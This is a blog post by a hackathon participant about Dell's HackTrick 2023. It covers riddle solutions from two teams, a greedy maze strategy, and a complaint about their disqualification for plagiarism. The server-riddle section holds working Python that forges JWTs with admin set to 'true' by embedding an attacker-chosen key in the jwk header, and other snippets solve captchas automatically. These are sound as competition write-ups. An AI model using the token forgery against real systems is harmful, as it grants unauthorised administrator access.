---
title: "Hacktrick23"
date: 2023-03-16T20:44:42+02:00
---



# Table of Contents
* [Welcome](#welcome)
* [Riddles](#riddles)
    * [Captcha](#captcha)
    * [Cipher](#cipher)
    * [Server](#server)
    * [pcap](#pcap)
* [Maze Solver](#maze-solver)
* [THE DRAMA](#the-drama)
    * [Hackathon workflow](#hackathon-workflow)
    * [Wednesday surprise](#wednesday-surprise)
    * [plagiarism rules](#plagiarism-rules)
    * [Standford moss tool checking](#stanford-moss-tool-checking)
    * [Slack kicking off](#slack-kicking-off)
* [Conclusion](#conclusion)
* [Shout out](#shout-out)

# Welcome
That's our short journey with Hacktrick this year be ready for some useful information and a lot of drama.
First, what is hacktrick?
Hacktrick is a hackathon organized by Dell that took place in Egypt. The hackathon aimed to bring together young innovators and developers to work on real-world challenges and create innovative solutions using technology.  
This year the hackathon was about AI, cybersecurity, and optimization, the problem, in short, is that you enter a maze (10*10) at the top left corner and the exit is at the bottom right corner inside the maze there are 4 children you want to rescue, to rescue a child you need to solve a riddle and the score depends on the number of children you rescued, how many steps you took, and the time to solve the riddles and there is a rule that if you didn't exit at the bottom right corner you will get only 80% of the score finally you have 5 submissions and your best one is taken into account.
So intuitively your aim was to rescue the largest number of children in the least number of steps whilst solving the riddles in minimal time.
You can make many approaches to this problem like RL and Informed search, we will talk about our approach later.  
[for the official documentation here.](https://github.com/HackTrick23/HackTrick23)
# Riddles
Let's talk about the riddles firstly, there were 4 types of riddles each has a different weight (captcha=10, cipher=20, server=30, PCAP=40) To be honest the riddles' difficulty level was disappointing. In our preparation for the hackathon, we expected more than that.  
In the next few lines, I will show snippets of code for our team -"code of duty"- and our friends' team -"respectively"- you will know the reason for that in the DRAMA part stay tuned.  
## Captcha
You are given an amazon captcha in the form of a 2D list and the target is to return the text inside it.  
Solving it took us 2 lines of code using the easyOCR open-source library which depends on PyTorch. An easier library was amazon captcha and it needs 2 lines of code too.
### code of duty approach:
```py
def captcha_solver(question):
    reader = easyocr.Reader(['en'])
    result = reader.readtext(np.array(question, dtype=np.uint8))
    return result[0][1]
```
### respectively approach: <a id="section-1"></a>
```py
def captcha_solver(question):
    img_bytes = BytesIO()
    img = Image.fromarray(np.array(question).astype('uint8'))
    img.save(img_bytes, format='JPEG')
    captcha = AmazonCaptcha(img_bytes)
    captcha.img = img
    solution = captcha.solve()
    return solution
```
## Cipher
You are given a message which was altered after it was ciphered and you need to return the original message.  
if you just noticed that it was altered just by encoding it base64 you are done with i. Post decoding, it gives you the message in binary format with the shift and you can solve it with classical Caesar cipher.
### code of duty approach:
Post decoding, we shift using ord() and chr() built-in functions according to the shift received. That takes place per character after we convert the binary formatted message to 7-bit ASCII.
```py
def cipher_solver(question):
    text = addpadding(question)
    binary = base64.decodebytes(text)
    binaryStr = str(binary)[3:-2]
    msg, shift = binaryStr.split(",")
    shift = int(shift, 2)
    return getMessage(msg, shift)
```
### respectively approach:
```py
def cipher_solver(question):
    padding = 4 - len(question) % 4
    question += "=" * padding
    decoded = base64.b64decode(question).decode("utf-8")
    cipherBits, shiftBits = decoded.split(',')
    shift = int(shiftBits[:-1], 2)
    cipherBits = cipherBits[1:]

    capital = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U',
               'V', 'W', 'X', 'Y', 'Z']
    small = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
             'v', 'w', 'x', 'y', 'z']

    solution = ""
    for i in range(len(cipherBits) // 7):
        num = int(cipherBits[i * 7:(i + 1) * 7], 2)
        num = num % 128
        index = (ord(chr(num).lower()) - 97) - shift

        if num > 96:  # small
            solution += small[index]
        else:  # capital
            solution += capital[index]

    return solution
```
## Server
Honestly, that problem took us much more time than it deserves.
You are given a jwt token which was signed by a private key. Your task is to alter the message and send it to the server with a valid signature. The vulnerability here is that the header contains the public key. So, the solution was simply through this public key. Change what you need in the token and sign it with any private key and send it with the header of your public key and make sure you have got the correct encodings.
### code of duty approach:
The public and private keys were generated previously and loaded from a file.
```py
def server_solver(question):
    decoded_payload = jwt.decode(question, options={"verify_signature": False})
    decoded_header = jwt.get_unverified_header(question)

    decoded_header['jwk']['e'] = _encode64Int(public_key.public_numbers().e)
    decoded_header['jwk']['n'] = _encode64Int(public_key.public_numbers().n)
    decoded_payload['admin'] = "true"
    jwt_token = jwt.encode(decoded_payload, private_key, algorithm="RS256", headers=decoded_header)
```
### respectively approach:
```py
def server_solver(question):
    payload = jwt.decode(question, options={"verify_signature": False}, algorithms=["RS256"])
    payload['admin'] = "true"

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )

    # Serialize the private key to PEM format
    pem_private_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )

    # Generate the public key from the private key
    public_key = private_key.public_key()

    # Serialize the public key to PEM format
    pem_public_key = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    jwk_public_key = jwk.JWK.from_pem(pem_public_key)

    new_token = jwt.encode(payload, key=pem_private_key, algorithm='RS256', headers={'jwk': jwk_public_key,
                                                                                     'kid': jwk_public_key["kid"]})

    return new_token
```
## PCAP
Giving a pcap file, and you know that the server was DNS exfiltrated from a specific IP you need to get what information was leaked.
Just filter the packets with the IP again, decode the subdomains with base64 and that's it.
### code of duty approach:
```py
def pcap_solver(question):
    sol = {}
    # Decode the Base64-encoded pcap file
    pcap_data = base64.b64decode(question)
    # Parse the packets using scapy
    packets = rdpcap(BytesIO(pcap_data))
    dns_packets = filter(lambda pkt: DNS in pkt and pkt[IP].dst == '188.68.45.12', packets)
    for pkt in dns_packets:
        query = pkt[DNSQR].qname.decode()
        splited = query.split(".")
        if len(splited[0]) % 4 != 0:
            padding_length = 4 - (len(splited[0]) % 4)
            splited[0] += "=" * padding_length
        if len(splited[1]) % 4 != 0:
            padding_length = 4 - (len(splited[1]) % 4)
            splited[1] += "=" * padding_length
        try:
            # Decode the base64 string to bytes
            num = base64.b64decode(splited[0])
            content = base64.b64decode(splited[1])
            num_str = num.decode('ascii')
            content_str = content.decode('ascii')
            sol[num_str] = content_str
        except:
            print("error")

    secret = ""
    for key in range(1, len(sol)+1):
        secret += sol[str(key)]
    return(secret)
    
```
### respectively approach:
```py
def pcap_solver(question):
    pcap_data = base64.b64decode(question)
    packets = rdpcap(io.BytesIO(pcap_data))
    data = {}
    for packet in packets:
        if DNSQR in packet and IP in packet and packet[IP].src == '188.68.45.12':
            dns_query_name = packet[DNSQR].qname.decode('utf-8')
            num = dns_query_name.find('.')
            rank_base64 = dns_query_name[:num]
            padding = 4 - len(rank_base64) % 4
            rank_base64 += "=" * padding
            first = base64.b64decode(rank_base64).decode('utf-8')
            cipherbase64 = dns_query_name[num + 1:dns_query_name.find('.', num + 1)]
            padding = 4 - len(cipherbase64) % 4
            cipherbase64 += "=" * padding
            second = base64.b64decode(cipherbase64).decode('utf-8')
            data[first] = second
    data = dict(sorted(data.items()))
    solution = ""
    for i in data:
        solution += data[i]
    return solution
```
# Maze Solver
As I mentioned before the maze was 10*10 you need to enter and rescue as many children as you can and then exit in the least number of steps. You got 5 submissions.
We worked on a combining algorithm between RL and heuristics and managed to build 2 models working very well and got 1st place with them in 2 submissions and at the end of the hackathon, we got 6th place. Our friends on the other hand worked with DFS with heuristics and did a great job too and got 5th place.
[to see the full code of the two teams here.](...........................................)  
To be there was a big problem with the maze that it didn't change through the submissions so it was easy for all the teams to follow up with the top teams on the leaderboard and inspire the solution from their results.
That's exactly what happened in the end when the teams realized that rescuing 2 children only and leaving the maze right on the minimum allowed number of steps (50) would give you a great score. So we began to make our model more greedy and managed to rescue 2 children in 50 steps which is the optimal greedy solution and our friends realized that trick too and managed to get that optimal greedy solution.
It was great work from both of us and we enjoyed optimizing our code and being greedy.
We sure wouldn't have done that if the maze was properly designed so that the best score you can get is by solving all riddles and reaching the end in minimal steps. But, the poor placement of the children made it easy for us to exploit that to uplift our score and gain more ground in the leaderboard.
Let alone the fact that this wouldn't have happened if the leaderboard only shows the final score of each team. In fact, it is allowed to see each team's submission of full information including the number of steps in the maze, whether they reached the end or not, which riddles did they solve, and the runtime of each riddle. 
So, for sure you can easily guess the approach of the team from all this information and make a similar approach.


# THE DRAMA
Ok, I think you got bored but here are some thrilling actions that happened in the end.

## Hackathon workflow:
the hackathon opening was on Friday 10th March. It was a nice day. Very delicious food (the most thing i enjoyed). The hackathon has officially begun at the opening. we didn't do much work on Friday and Saturday. We began working starting from Sunday. We worked very hard and made our first submission on Tuesday at 6 AM before our friends. We didn't get much score (of 7) but it was just a trial. Our friends submitted after us and they didn't do very well too but with the second submission for us we got first place with 149 steps![our first submission](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/first.png) but we didn't keep it for long then we worked on some optimization (literally this submission was through a different model) and made our third submission and took the first place again with 52 steps only but we were greedy and rescued only 2 children and the 2 left submissions were a foregone conclusion.
our friends on the other side got some optimization too and managed to scroll up in the leaderboard and with their 4th submission finally, they made a remontada on us and got 5th place but they deserved it. ![final leaderBoard](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/final.jpeg)
![final scores](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/scores.jpeg)

## Wednesday surprise:
we all slept on Tuesday having no ideas except of planning the next phase and reserving train tickets from Alexandria to Cairo to attend the closing but, we, the 2 teams, got a rejection mail with no reason![rejection mail](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/mail.jpeg) after contacting some mentors they told as that it was a plagiarism case. We tried to defend ourselves but no one listened. They just wanted to begin the next phase and they didn't care about anything we said. At the end of the day, they kicked us out of the slack just because we expressed our opinion about what happened to us.
Here is their response. Blind evident-less accusation with no chance of conversation.
![response mail](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/mail3.jpeg)
![response mail](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/mail2.jpeg)
![response mail](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/WhatsApp%20Image%202023-03-17%20at%202.41.31%20AM.jpeg)
## plagiarism rules:
they didn't say anything about plagiarism in the documentation or in the brief video except this phrase "any plagiarism will be detected and penalized" but let us see what they have told us to shut us up:
- plagiarism is based on multiple aspects:
    - the total score of the leaderboard submission and its details (which was the first time in my life to hear about this invented rule).
    - time taken to solve different riddles (which differs from one submission to another on the same machine XD, taking into consideration that submissions were executed locally).
    - time also depend on your network latency as you do API request to amazon servers.
   ![The rules](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/pliagrism.jpeg)
    - the tiebreaker was by the first submission so saying that plagiarism is based on these silly rules doesn't make sense.
## Stanford MOSS tool checking:
To make sure that we didn't make any plagiarism we checked the two codes by ourselves using MOSS which is a tool provided by Standford to check plagiarism for programming languages [more about it](https://theory.stanford.edu/~aiken/moss/) and as we expected we got similarity in the base code only (should we account for it??) 
![Moss](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/MOss.jpeg)
## Slack Kicking off:
That was the post for why we were kicked off, and that make us wonder "what is success for them?". Is that making a great show for opening and closing, or taking awesome photos and presenting weak content in the challenge itself?![the post](https://raw.githubusercontent.com/m13salama/blog/main/content/posts/slack.jpeg)
## conclusion:
As a summary we made a great performance at this hackathon and gave a lot of effort but, as a result, we got disqualified just because we got too close scores without any strong evidence and without any reasonable clarification, Thanks HackTrick for that awful experience.
## Shout Out:
Thanks to all my team members [mohamed aiad](https://github.com/mohamedaiad), [mohamed mostafa](https://github.com/mohamed-euler), [yousef ahmed](https://github.com/usefSaeed), [michael samir](https://github.com/MichaelSamir75) and [ahmed abdallah](https://github.com/ahme2001), and thanks for all my friends from **"RESPECTIVELY"** [Abd-elrahman Bahaa](https://github.com/AbdelrahmanMosly), [Abd-elrahman El-sayed](https://github.com/Mento79), [Ahmed Adel](https://github.com/Deffo0), [Yousef bazina](https://github.com/Bazina), [Omar Metmawwah](), [Mohamed Kotb](https://github.com/MuhammadElkotb) I am really so proud of our work and what we have achieved regardless of the endings and I am really happy of supporting each other we are much more than a family, not just competitors or friends.
